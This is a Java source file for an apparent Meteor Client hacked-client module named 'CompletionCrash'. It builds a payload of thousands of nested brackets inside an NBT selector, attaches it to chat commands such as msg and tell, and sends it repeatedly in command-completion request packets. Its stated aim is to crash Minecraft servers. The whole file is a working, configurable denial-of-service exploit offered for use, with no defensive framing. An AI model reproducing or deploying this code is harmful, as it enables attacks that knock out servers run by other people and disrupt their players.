package me.reich.crash.modules;

import me.reich.crash.Crash;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import com.google.gson.JsonObject;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CompletionCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets")
        .description("How many packets to send to the server.")
        .defaultValue(3)
        .sliderRange(1, 5)
        .build());

    private final Setting<Integer> length = sgGeneral.add(new IntSetting.Builder()
        .name("Length")
        .description("Command Length")
        .defaultValue(2005)
        .sliderRange(500, 32500)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("Auto Disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    private final Setting<String> message = sgGeneral.add(new StringSetting.Builder()
        .name("message")
        .description("message")
        .defaultValue("msg @a[nbt={PAYLOAD}]")
        .build()
    );

    public CompletionCrash() {
        super(Crash.CATEGORY, "Completion Crash", "command completion crash");
    }

    private int messageIndex = 0;

    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
    private static final String[] knownWorkingMessages = {
        "msg",
        "minecraft:msg",
        "tell",
        "minecraft:tell",
        "tm",
        "teammsg",
        "minecraft:teammsg",
        "minecraft:w",
        "minecraft:me"
    };

    @Override
    public void onActivate(){
        messageIndex = 0;
        String overflow = generateJsonObject(length.get());
        String partialCommand = message.get().replace("{PAYLOAD}", overflow);
        for(int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) throws InterruptedException {
        if(messageIndex == knownWorkingMessages.length - 1) {
            if(isActive()) toggle();
            messageIndex = 0;
            return;
        }
        TimeUnit.SECONDS.sleep(1);
        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
        for(int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
        messageIndex++;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    /*private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels)
            .mapToObj(i -> "[")
            .collect(Collectors.joining());
        String json = "{a:" + in + "}";
        return json;
    }*/
    private String generateJsonObject(int levels) {
        StringBuilder builder = new StringBuilder("{a:");
        for (int i = 0; i < levels; i++) {
            builder.append("[");
        }
        builder.append("}");
        return builder.toString();
    }

}

